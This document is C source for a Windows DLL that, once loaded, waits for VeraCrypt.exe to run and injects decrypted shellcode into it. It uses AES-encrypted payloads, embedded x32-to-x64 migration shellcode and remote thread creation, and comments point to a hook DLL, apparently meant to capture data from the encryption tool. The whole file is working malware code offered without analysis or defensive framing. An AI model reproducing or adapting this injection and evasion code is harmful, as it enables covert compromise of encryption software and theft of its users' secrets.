//migrate and inject function

#include <winternl.h>
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES;
typedef OBJECT_ATTRIBUTES *POBJECT_ATTRIBUTES;

typedef NTSTATUS (NTAPI * NtCreateThreadEx_T) (
	PHANDLE ThreadHandle,
	ACCESS_MASK DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes,
	HANDLE ProcessHandle,
	PVOID StartRoutine,
	PVOID Argument,
	ULONG CreateFlags,
	ULONG_PTR ZeroBits,
	SIZE_T StackSize,
	SIZE_T MaximumStackSize,
	PVOID AttributeList
);

//required for cross injection (x32 host process -> x64 victim process)
//simple struct for RtlCreateThread parameters
typedef struct _WOW64CONTEXT
{
  union
  {
    HANDLE hProcess;
    BYTE bPadding2[8];
  } h;
  union
  {
    LPVOID lpStartAddress;
    BYTE bPadding1[8]; 
  } s;
  union
  {
    LPVOID lpParameter;
    BYTE bPadding2[8];
  } p;
  union
  {
    HANDLE hThread;
    BYTE bPadding2[8];
  } t;
} WOW64CONTEXT, * LPWOW64CONTEXT;
//The native x64 function you specify must be in the following form (as well as being x64 code):
typedef BOOL (WINAPI * X64FUNCTION)( DWORD dwParameter );
//Can be called from C using the following prototype: (more explained in the InjectWOW64 function)
typedef DWORD (WINAPI * EXECUTEX64)( X64FUNCTION pFunction, DWORD dwParameter );


unsigned char AESkey[] = { 0 }; //place key of hook.dll here
unsigned char payload[] = { 0 }; //place encrypted shellcode of migrateInject.dll here
unsigned int payload_len = sizeof(payload);
unsigned int key_len = sizeof(AESkey);

int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
        HCRYPTPROV hProv;
        HCRYPTHASH hHash;
        HCRYPTKEY hKey;

        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
                        return -1;
        }
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
                        return -1;
        }
        if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
                        return -1;              
        }
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
                        return -1;
        }
        
        if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *) payload, (DWORD *) &payload_len)){
                        return -1;
        }
        
        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        CryptDestroyKey(hKey);
        
        return 0;
}


int FindProcess(char * pName){
	HANDLE hProcessSnap;
	HANDLE hProcess;
	PROCESSENTRY32 pe32;
	
	hProcessSnap = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );
	if( hProcessSnap == INVALID_HANDLE_VALUE)
		return NULL;

	pe32.dwSize = sizeof( PROCESSENTRY32 );

	if( !Process32First( hProcessSnap, &pe32 )){
		CloseHandle(hProcessSnap);
		return NULL;
	}
	
	do {
				
		if(strcmpi(pName, pe32.szExeFile) == 0) return pe32.th32ProcessID;
		
	} while (Process32Next(hProcessSnap,&pe32));
		pe32.th32ProcessID;
		
	
	return 0;
}

int InjectDLL(HANDLE hProcess){
	
	//x32 -> x64 migration & thread creation
	unsigned char execute64_key[] = { 0xe, 0xa3, 0x42, 0x53, 0x5e, 0x40, 0xa1, 0xc5, 0xa1, 0x6b, 0x23, 0xae, 0x4a, 0xe6, 0x5a, 0x52 };
	unsigned char execute64_payload[] = { 0x79, 0xae, 0x5, 0xfc, 0x84, 0x89, 0xd5, 0xe0, 0x6b, 0x20, 0xec, 0x1f, 0x9a, 0xf5, 0xe9, 0x3f, 0x66, 0x36, 0x15, 0x97, 0x4d, 0x2b, 0x7a, 0xd, 0x62, 0x0, 0xc, 0x22, 0x97, 0x7a, 0xa2, 0x79, 0xd6, 0x4e, 0x5e, 0xd9, 0x84, 0x72, 0x5f, 0x47, 0x6b, 0x77, 0xe0, 0x97, 0xbc, 0x71, 0xb, 0x93, 0x0, 0x5a, 0xe1, 0xee, 0xbc, 0xb9, 0xa8, 0x2e, 0x5c, 0x17, 0xc9, 0xd4, 0x2c, 0x75, 0xd3, 0x7c, 0x74, 0xc8, 0x18, 0xbb, 0x44, 0x40, 0x8a, 0xea, 0x73, 0x99, 0x97, 0x8e, 0x50, 0x53, 0x95, 0x1d, 0xac, 0xf, 0xd6, 0x71, 0x7, 0x58, 0x93, 0xe8, 0x7f, 0x23, 0xd7, 0x27, 0xa8, 0xff, 0x4c, 0x5b };
	unsigned int execute64_key_len = sizeof(execute64_key);
	unsigned int execute64_payload_len = sizeof(execute64_payload);
	
	unsigned char function64_key[] = { 0x86, 0x92, 0x97, 0x9c, 0x3e, 0x11, 0xd1, 0x9c, 0x29, 0x59, 0xc9, 0xd6, 0xf7, 0x62, 0x1d, 0x63 };
	unsigned char function64_payload[] = { 0xa4, 0x32, 0xa7, 0xe3, 0xe0, 0xd0, 0xa2, 0xe8, 0xad, 0x7a, 0x77, 0xff, 0xd2, 0xa3, 0x4b, 0xd3, 0xd5, 0x1c, 0xa8, 0x3f, 0x60, 0xed, 0x16, 0x57, 0x63, 0xdc, 0xeb, 0x63, 0xbe, 0x66, 0x85, 0x5b, 0xa8, 0x23, 0x7e, 0xd, 0x87, 0x95, 0x74, 0xc8, 0xf3, 0x94, 0xd8, 0x97, 0xf8, 0xd6, 0x79, 0xc7, 0x5a, 0xbb, 0xf, 0x14, 0xd8, 0xab, 0x7a, 0x7a, 0x3d, 0xb, 0xf8, 0x26, 0x2b, 0x6f, 0x8c, 0xd3, 0x41, 0x53, 0x96, 0x22, 0x73, 0xdc, 0x9d, 0xe3, 0x97, 0x98, 0xa2, 0x96, 0x9d, 0x56, 0x80, 0x97, 0xa5, 0x4f, 0x97, 0xa7, 0xae, 0xc0, 0x16, 0x4a, 0x4d, 0x20, 0x2c, 0xa1, 0xdd, 0x86, 0xf6, 0x7a, 0x1e, 0x13, 0x10, 0x3, 0xe2, 0x31, 0xa7, 0x3f, 0x33, 0x76, 0xa6, 0x77, 0x5b, 0x11, 0x44, 0x58, 0x47, 0xe1, 0x3c, 0xd5, 0xf5, 0x30, 0xcf, 0xbe, 0xd8, 0x3, 0x14, 0xaf, 0x6e, 0x1d, 0xa6, 0xe4, 0x99, 0xa0, 0x8, 0xca, 0xd9, 0xfa, 0x87, 0x7d, 0x2b, 0xca, 0x4a, 0x2a, 0x4a, 0x3, 0x3d, 0x4d, 0xf5, 0xde, 0x6f, 0x7, 0x81, 0x62, 0x10, 0xbf, 0x8c, 0xa1, 0x67, 0x5b, 0x2c, 0x18, 0x50, 0xb0, 0xbc, 0x7a, 0x74, 0x87, 0x29, 0xe8, 0xdc, 0x92, 0xd1, 0xae, 0xfa, 0x5b, 0x62, 0x7a, 0xe7, 0x33, 0x67, 0x55, 0x37, 0xa0, 0xb9, 0x76, 0x72, 0xa6, 0xc6, 0x6f, 0x76, 0xc, 0x3b, 0xd8, 0xb1, 0x1f, 0x7a, 0x8d, 0x73, 0xf2, 0xec, 0xf3, 0x15, 0x5c, 0x26, 0xe7, 0x75, 0xde, 0xea, 0x7c, 0xc3, 0xb5, 0xee, 0xf2, 0x2b, 0x7e, 0xa7, 0xd6, 0xdd, 0x22, 0xfa, 0x49, 0x99, 0xa2, 0x36, 0xe7, 0x15, 0xc3, 0x92, 0xab, 0x74, 0x7, 0xee, 0x42, 0xdf, 0x49, 0xb2, 0x55, 0x34, 0xfa, 0x59, 0x74, 0x2e, 0x27, 0x8c, 0xe1, 0xf6, 0x9c, 0xaa, 0x80, 0x4, 0x9a, 0x1a, 0x7, 0xc5, 0xe4, 0xa7, 0x53, 0x27, 0x9d, 0xe, 0x41, 0xca, 0x6e, 0x88, 0x5b, 0x64, 0xfb, 0x8f, 0x49, 0xff, 0x83, 0x9c, 0x74, 0x56, 0x8e, 0xd, 0xca, 0x7, 0x6c, 0x3f, 0xfb, 0x1b, 0x53, 0x45, 0xce, 0xbc, 0xfc, 0x1d, 0x2e, 0x76, 0x95 };
	unsigned int function64_key_len = sizeof(function64_key);
	unsigned int function64_payload_len = sizeof(function64_payload);
	
	// ctx variable will be used to hold the paramaters of RtlCreateThread
	WOW64CONTEXT * ctx;
	
	LPVOID remote_memory = NULL;
	DWORD oldProtect;
	NtCreateThreadEx_T pNtCreateThreadEx = (NtCreateThreadEx_T) GetProcAddress(GetModuleHandle("NTDLL.DLL"),"NtCreateThreadEx");
	HANDLE hThread;
	
	remote_memory = VirtualAllocEx( hProcess, NULL, payload_len, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	//decrypting payload and placing it in memory
	AESDecrypt( (char *)payload, payload_len, (char *)AESkey, key_len); 
	WriteProcessMemory( hProcess, remote_memory, payload, payload_len, 0);
	VirtualProtectEx( hProcess, remote_memory, payload_len, PAGE_EXECUTE_READWRITE, &oldProtect);
	
	AESDecrypt( (char *)execute64_payload, execute64_payload_len, (char *)execute64_key, execute64_key_len); 
	AESDecrypt( (char *)function64_payload, function64_payload_len, (char *)function64_key, function64_key_len); 

	X64FUNCTION pFunc64 = (X64FUNCTION) VirtualAlloc( 0, function64_payload_len, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);	
	EXECUTEX64 pExec64 = (EXECUTEX64) VirtualAlloc( 0, execute64_payload_len, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);	
	LPVOID ctx_mem = VirtualAlloc( 0, sizeof(WOW64CONTEXT), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);	
	
	memcpy( pFunc64, function64_payload, function64_payload_len);
	memcpy( pExec64, execute64_payload, execute64_payload_len);
		
	// initialize ctx structure
	ctx = (WOW64CONTEXT *) ctx_mem; 

	ctx->h.hProcess = hProcess;
	ctx->s.lpStartAddress = remote_memory;
	ctx->p.lpParameter = 0;
	ctx->t.hThread = NULL;

	// execute the two functions as described in the github link above
	pExec64( pFunc64, (DWORD)ctx);

	if( ctx->t.hThread ) {
		ResumeThread(ctx->t.hThread);
		return 0;
	} else {
		return 1;
	}
	
	
	return 0;
}


int Go(){
	
	char pName[] = "VeraCrypt.exe";
	
	
	int PID = FindProcess(pName);
	
	while (FindProcess(pName) == 0){
		PID = FindProcess(pName);
		Sleep(5000);
	}
	HANDLE hProcess = OpenProcess( PROCESS_ALL_ACCESS, 0, PID);
	
	if (hProcess != NULL) {
		InjectDLL(hProcess);
		CloseHandle(hProcess);
		return 0;
	}
	
	return 1;
	
}

BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ){

	switch (ul_reason_for_call){
	case DLL_PROCESS_ATTACH:
		Go();
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}